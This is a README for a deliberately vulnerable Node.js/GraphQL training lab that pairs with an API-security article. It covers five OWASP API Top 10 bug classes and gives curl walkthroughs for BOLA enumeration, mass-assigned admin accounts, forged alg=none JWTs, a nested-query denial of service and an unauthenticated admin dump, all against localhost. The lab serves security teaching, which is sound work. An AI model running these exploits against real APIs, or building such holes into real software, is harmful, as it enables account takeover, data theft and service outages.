# api-basic

The companion lab for TechEarl's [API security attacks](https://techearl.com/api-security-attacks) article. A small Node.js + Express + graphql-yoga server that ships four OWASP API Top 10 (2023) bug classes in one process, plus a bonus BFLA endpoint.

| Class | Endpoint | Bug |
|---|---|---|
| API1 BOLA | `GET /users/:id` | No ownership check on the `:id` parameter. |
| API2 Broken Auth | `POST /login` + verifier | Verifier honours `alg=none` JWTs. |
| API3 Mass assignment | `POST /users` | Spreads `req.body` into the user record, including `isAdmin`. |
| API4 Unrestricted resource consumption | `POST /graphql` | Introspection on, no depth or cost limit. |
| API5 BFLA (bonus) | `GET /admin/dump` | Admin-only by intent, no role check. |

## Running

```bash
docker compose up -d --build api-basic
```

From the **root** of the `techearl-labs` repo. Lab listens on `http://localhost:8088`.

```bash
curl -s http://localhost:8088/
```

Should print the endpoint index.

## Seeded users

| id | username | password | isAdmin |
|---|---|---|---|
| 1 | alice | alice123 | false |
| 2 | bob | bob123 | false |
| 3 | admin | admin123 | true |

## Exploit walkthroughs

### 1. BOLA: read any user as any user

Log in as `alice`, then read `bob`'s record (id 2). Alice should only see her own row; the handler does not check.

```bash
TOKEN=$(curl -s -X POST http://localhost:8088/login \
  -H 'Content-Type: application/json' \
  -d '{"username":"alice","password":"alice123"}' | jq -r .token)

curl -s http://localhost:8088/users/2 -H "Authorization: Bearer $TOKEN"
```

Returns Bob's full record including `ssn` and `email`. Walk `/users/1`, `/users/2`, `/users/3` to enumerate everyone.

### 2. Mass assignment: become an admin on signup

The `POST /users` handler binds the entire JSON body into the new record. Add `isAdmin: true` and the new account is administrative.

```bash
curl -s -X POST http://localhost:8088/users \
  -H 'Content-Type: application/json' \
  -d '{"username":"mallory","password":"x","email":"m@x.io","isAdmin":true}'
```

The response echoes the created user with `isAdmin: true`.

### 3. JWT alg=none: forge an admin token

Take any valid token, base64url-encode a `{"alg":"none","typ":"JWT"}` header and a payload of your choice, drop the signature, and the broken verifier accepts it.

```bash
HEADER=$(printf '{"alg":"none","typ":"JWT"}' | base64 | tr -d '=' | tr '/+' '_-')
PAYLOAD=$(printf '{"sub":3,"username":"admin","isAdmin":true}' | base64 | tr -d '=' | tr '/+' '_-')
FORGED="${HEADER}.${PAYLOAD}."

curl -s http://localhost:8088/me -H "Authorization: Bearer $FORGED"
curl -s http://localhost:8088/users/3 -H "Authorization: Bearer $FORGED"
```

`/me` returns the forged payload. The forged token also unlocks any BOLA target.

### 4. GraphQL introspection + nested-query DoS

Introspection is on. Map the schema first:

```bash
curl -s -X POST http://localhost:8088/graphql \
  -H 'Content-Type: application/json' \
  -d '{"query":"{ __schema { types { name } } }"}'
```

Then ship a deeply-nested friends-of-friends query. Each `User` resolves its friends back into more `User` nodes, so a 10-deep query fans out into a huge resolver tree from a single small request:

```bash
curl -s -X POST http://localhost:8088/graphql \
  -H 'Content-Type: application/json' \
  -d '{"query":"{ user(id:1){ friends { friends { friends { friends { friends { friends { friends { friends { friends { username }}}}}}}}}}}"}' \
  -o /dev/null -w 'bytes=%{size_download} time=%{time_total}s\n'
```

The response size and CPU time grow exponentially with depth. There is no depth or cost limit to stop the request.

### 5. BFLA: admin endpoint with no admin check (bonus)

```bash
curl -s http://localhost:8088/admin/dump
```

Returns every user record without any authentication or admin gate.

## Tearing down

```bash
docker compose down
```

No persistent state. A plain `down` is enough.

## Safety

Bound to `127.0.0.1` by default. Do not expose this container to a public interface. The bugs are real: the JWT verifier accepts `alg=none`, the user creation endpoint trusts the body, the GraphQL endpoint will happily exhaust CPU. Treat the seeded credentials (`alice / alice123`, `bob / bob123`, `admin / admin123`) as throwaway lab data and never reuse them.
